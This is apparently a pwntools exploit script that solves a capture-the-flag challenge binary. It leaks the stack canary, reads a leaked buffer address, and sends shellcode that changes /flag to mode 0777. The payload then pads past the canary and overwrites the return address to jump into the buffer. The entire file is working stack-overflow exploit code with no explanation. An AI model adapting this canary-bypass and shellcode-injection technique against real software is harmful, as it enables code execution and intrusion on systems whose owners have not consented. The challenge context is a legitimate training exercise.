from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/toddlerone-level-6-0")

io = elf.process()
io.sendline(b"512")
io.send("REPEAT")
io.recvuntil("the canary value is now ")
CANARY = p64(int(io.recvuntil("\n")[:-2].decode(), 16))
io.recv()
io.sendline(f"512")
print(io.recvuntil("This will allow you to write from ").decode())
res = io.recvuntil("\n").decode().split(' ')[0]
BUFF_ADDR = int(res,16)
ret_distance = 49+8
SHELLCODE = asm(shellcraft.chmod("/flag", 0o777))
CANARY_PADDING = b'A'*9
PAYLOAD = SHELLCODE + CANARY_PADDING +p64(0x000000000100000000)+p64(0x00000000000000005a) +p64(0x000000000000000000)+CANARY + p64(0x000000000000000000)+p64(0x000000000000000000)+p64(0x000000000000000000)+p64(BUFF_ADDR)
io.send(PAYLOAD)
io.interactive()

